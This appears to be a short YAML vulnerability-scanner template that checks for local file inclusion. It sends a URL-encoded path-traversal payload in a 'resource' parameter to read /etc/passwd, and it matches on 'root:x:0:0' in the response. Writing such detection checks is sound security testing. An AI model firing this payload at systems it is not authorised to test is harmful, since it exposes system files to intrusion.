id: lfi6-1237
name: 'Traversal in resource'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via resource'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      resource:
        - '%2e%2e%2fetc%2fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
